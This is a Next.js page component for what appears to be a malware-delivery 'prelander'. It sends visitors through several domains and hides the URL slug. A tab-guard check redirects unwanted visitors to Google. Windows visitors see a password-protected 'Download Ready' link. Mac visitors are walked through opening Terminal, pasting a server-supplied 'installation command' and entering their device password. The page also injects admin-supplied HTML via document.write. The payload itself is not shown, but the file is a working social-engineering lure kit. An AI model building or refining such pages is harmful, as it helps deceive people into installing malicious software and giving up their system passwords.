'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'

import { guardTab } from '@/lib/tab-guard'

import { SESSION_UNAVAILABLE_TITLE, SESSION_UNAVAILABLE_MESSAGE } from '@/lib/prelander-session'

// The server validates the session on each resolve. Cookies are shared across tabs.
function SessionUnavailable() {
  return (
    <main className="min-h-screen flex items-center justify-center bg-[#f0f2f5] p-6">
      <section className="w-full max-w-md rounded-2xl bg-white p-8">
        <h1 className="text-2xl font-semibold text-gray-900">{SESSION_UNAVAILABLE_TITLE}</h1>
        <p className="mt-4 leading-relaxed text-gray-600">{SESSION_UNAVAILABLE_MESSAGE}</p>
      </section>
    </main>
  )
}

export default function PrelanderSlugPage() {
  const params = useParams()
  // slug == "session" is the CLEAN-URL sentinel: the page was mounted at the
  // bare prelander domain root (https://prelander-domain.com/) and resolves
  // its content entirely from the server-side browsing-session cookie.
  const slug = (params.slug as string) || 'session'
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [denied, setDenied] = useState(false)
  // True while the browser is transitioning from an Anchor/Inter domain to the
  // Prelander domain. We hold a loader on screen for a short fixed delay so the
  // visitor sees a clean "redirecting…" state rather than a jarring hop.
  const [transitioning, setTransitioning] = useState(false)

  useEffect(() => {
    (async () => {
      // Avoid repeating a request after the server has denied this load.
      if (denied) {
        return;
      }

      if (!slug) { 
        setDenied(true)
        setLoading(false)
        return 
      }

      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''

      // ── CLEAN URL MODE (spec) ───────────────────────────────────────────
      // slug == "session": mounted at the bare prelander root. No hop
      // decisions apply — resolve content from the browsing-session cookie.
      if (slug === 'session') {
        // NO SLUG VISIBLE, EVEN WHILE LOADING: scrub the path to the bare
        // root immediately — before any fetch renders anything.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }

        // 1) your existing call (slug route or "session"), unchanged
        const res = await fetch('/api/prelander/resolve/session', {
          credentials: "include",
          headers: { 'X-Prelander-Host': hostname },
        });
        
        if (res.status === 204 || !res.ok) {
          setDenied(true)
          setLoading(false)
          return
        }
        
        const data = await res.json()
        if (!data?.success) {
          setDenied(true)
          setLoading(false)
          return
        }
        
        // 2) NEW: claim AFTER resolve (so the cookie-mint fallback path, which
        //    sets the arrival flag inside resolve, also works), BEFORE rendering
        if (!(await guardTab())) return;      // redirected to google, render nothing
        
        // 3) now it is safe to show the content
        setData(data)
        setLoading(false)
        return
      }

      try {
        // Step 1: check if this hostname is the Prelander domain.
        // If not, redirect the browser to the Prelander domain with the same
        // slug. This avoids fetch() swallowing the 302 from the backend.
        // The slug is passed so the backend can also detect bypass mode and
        // return the Campaign URL directly (bypass ON spec).
        const dtUrl = `/api/prelander/domain-type?host=${encodeURIComponent(hostname)}&slug=${encodeURIComponent(slug)}`

        const dtRes = await fetch(dtUrl)

        if (dtRes.ok) {
          const dt = await dtRes.json()

          // Bypass ON (spec): Anchor → Inter (0.75s dwell) → Campaign URL.
          // We're on the Inter domain — hold the 0.75s loader, then go straight
          // to the Campaign URL. The landing page is never shown.
          if (dt.bypass_redirect_url) {
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            window.location.replace(dt.bypass_redirect_url)
            return
          }
          
          // `last_domain` is the pre-glossary name the API still mirrors.
          const prelanderDomain = dt.prelander_domain ?? dt.last_domain

          // The backend resolves the NEXT managed hop (chain-aware): the next
          // chain hop, the weighted Prelander pool pick, or the legacy
          // publisher/global Prelander domain. It only returns a URL when this
          // host is NOT the final prelander — so trust the returned hop over
          // the domain_type (a prelander-typed domain positioned mid-chain must
          // keep hopping).
          if (prelanderDomain) {
            // Cross-domain handoff (STEP 4): when leaving the Inter domain for
            // the prelander, mint a one-time handoff and exchange it at
            // /_auth/{handoff} on the prelander domain — the bootstrap consumes
            // it once, sets the prelander-domain HttpOnly session cookie, and
            // lands the visitor on the clean root. Refreshes then ride the
            // session cookie, never the handoff.
            // A failed handoff shows the same session-unavailable message.
            let handoffToken: string | null = null
            try {
              const hRes = await fetch(
                `/api/prelander/handoff?slug=${encodeURIComponent(slug)}&target_host=${encodeURIComponent(new URL(prelanderDomain).hostname)}`,
                { headers: { 'X-Prelander-Host': hostname }, cache: 'no-store', redirect: 'manual' }
              )

              if (hRes.ok) {
                const h = await hRes.json()
                handoffToken = h?.handoff || null
              } else if (hRes.status === 302 || hRes.status === 301 || hRes.status === 307) {
                // POOL-PICK SELF-HEALING: the backend refused this target (the
                // click was routed to a DIFFERENT prelander domain than the
                // stale /domain-type response suggested) and returned a
                // redirect to the session-recorded host carrying the same
                // slug. Follow it: the correct domain mints the handoff there.
                const hop = hRes.headers.get('location')
                if (hop) {
                  setTransitioning(true)
                  await new Promise(r => setTimeout(r, 750))
                  window.location.replace(hop)
                  return
                }
              }
            } catch (handoffError) {
              // Handle handoff error
            }

            if (!handoffToken) {
              // Authorization failed; keep protected data out of the page.
              setDenied(true)
              return
            }

            // TIMER LIVES ON THE INTER DOMAIN ONLY (spec): the 0.75s dwell
            // runs right here, on the Inter page, during the hop. The
            // prelander domain itself never waits — it loads naturally.
            // ZERO SLUG LEAKAGE (spec Tests C/I): the hop goes to /_auth/{handoff}
            // and lands on the CLEAN ROOT — the slug travels ONLY inside the
            // server-side session binding, never in any public URL. The
            // address bar goes from interdomain/d/{slug} directly to
            // https://prelanderdomain.com/ with nothing in between.

            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            const authUrl = `${prelanderDomain}/_auth/${handoffToken}`

            window.location.replace(authUrl)
            return
          }
        }

        // Step 2: on the Prelander domain (or type unknown) — fetch prelander data
        // 1) your existing call (slug route or "session"), unchanged
        const res = await fetch(`/api/prelander/resolve/${slug}`, {
          credentials: "include",
          headers: { "X-Prelander-Host": window.location.hostname },
        });
        
        // HTTP 204 = server denied (204 is 2xx so res.ok is TRUE — handle it
        // BEFORE res.ok/json parsing, the empty body breaks res.json()).
        if (res.status === 204 || !res.ok) {
          setDenied(true)
          return
        }

        const data = await res.json()

        if (!data?.success) {
          setDenied(true)
          return
        }

        // 2) NEW: claim AFTER resolve (so the cookie-mint fallback path, which
        //    sets the arrival flag inside resolve, also works), BEFORE rendering
        if (!(await guardTab())) return;      // redirected to google, render nothing

        // 3) now it is safe to show the content
        setData(data)
        
        // CLEAN FINAL URL (spec): the visible prelander address must be
        // https://prelander-domain.com/ — no slug, no ids, and rewritten
        // IMMEDIATELY (before this render paints the data) so the slug is
        // never visible even during loading. From here refreshes ride the
        // browsing-session cookie (the /d/session route), not the slug.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }
      } catch (error) {
        // Show the session message without exposing internal errors.
        setDenied(true)
      } finally {
        setLoading(false)
      }
    })();
  }, [slug, denied])

  useEffect(() => {
    document.title = denied ? SESSION_UNAVAILABLE_TITLE : 'Download Ready'
  }, [denied])

  if (denied) return <SessionUnavailable />

  // Simple professional loader — shown during the data fetch and during the
  // 0.75s Inter-domain dwell. Nothing extra: one spinner, one line of text.
  if (loading || transitioning) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f7f8fa]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-8 h-8 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
          <p className="text-sm text-gray-500">
            {transitioning ? 'Redirecting…' : 'Loading…'}
          </p>
        </div>
      </div>
    )
  }

  if (!data) return <SessionUnavailable />

  // Note: Bypass OFF always shows the landing page — even when the backend has
  // no active template (the built-in layout renders as fallback). The visitor
  // is only forwarded straight to the campaign URL when Bypass is ON, which
  // happens earlier via `bypass_redirect_url` from /domain-type.

  // Admin pasted a complete HTML template → the backend already rendered it
  // server-side ({Campaign_URL} / {Password} shortcodes substituted). Serve it
  // as a full-page document instead of the built-in layouts.
  if (data.rendered_html) return <FullHtmlPrelander html={data.rendered_html} />

  if (data.os === 'mac') return <MacPrelander data={data} />
  return <WindowsPrelander data={data} />
}

/* ─── Full HTML: server-rendered custom template ─────────────────────────── */
function FullHtmlPrelander({ html }: { html: string }) {
  useEffect(() => {
    // Replace the whole document so <!DOCTYPE html>, <head> styles and the
    // template's scripts behave exactly as the admin authored them.
    document.open()
    document.write(html)
    document.close()
  }, [html])
  return null
}

/* ─── Windows Prelander ──────────────────────────────────────────────────── */
function WindowsPrelander({ data }: { data: any }) {
  const [copied, setCopied] = useState(false)
  // Template customisation fields resolved by the backend (assigned template
  // or OS default); fall back to the historical copy when no template data.
  const tpl = data?.template
  const title = tpl?.title ?? 'Your file is ready to download'
  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
  const buttonText = tpl?.button_text ?? 'Copy'

  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url).catch(() => {})
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}>
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
              </button>
            </div>
          </div>

          {data.password && (tpl?.show_password_field ?? true) && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>
        <p className="text-center text-xs text-gray-400 mt-4">Secure file hosting service</p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ──────────────────────────────────────────────────────── */
function MacPrelander({ data }: { data: any }) {
  const [copiedCmd, setCopiedCmd] = useState(false)
  const installCommand = data.offer_url || ''
  // Template customisation fields — same source as the Windows prelander.
  const tpl = data?.template
  const title = tpl?.title ?? 'How to open Terminal on Mac'

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand).catch(() => {})
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
          </div>

          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}>
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3">
              {[
                <>Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.</>,
                <>Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.</>,
                <>Once the Terminal window is open, proceed with the steps below.</>,
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>
          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              {[
                'Copy the installation command above.',
                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                'Enter your device password and confirm the installation.',
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>
          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video className="w-full h-full" controls playsInline autoPlay muted loop preload="auto" src="/terminal.mp4" />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">Secure installation service</p>
      </div>
    </div>
  )
}
